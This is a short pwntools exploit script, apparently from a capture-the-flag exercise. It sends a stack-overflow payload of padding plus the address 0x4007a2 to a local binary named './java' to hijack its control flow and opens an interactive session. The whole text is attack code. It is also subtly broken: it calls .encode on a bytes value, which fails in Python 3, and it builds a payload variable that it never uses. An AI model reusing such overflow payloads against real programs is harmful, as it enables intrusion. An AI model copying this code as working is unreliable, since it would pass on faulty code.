from pwn import *

target = p64(0x4007a2)
payload = b'java'+b'A'*(28)+target
payload = payload.encode("ascii")
msgin = payload+target

p=process("./java")
p.sendline(payload)
p.interactive()
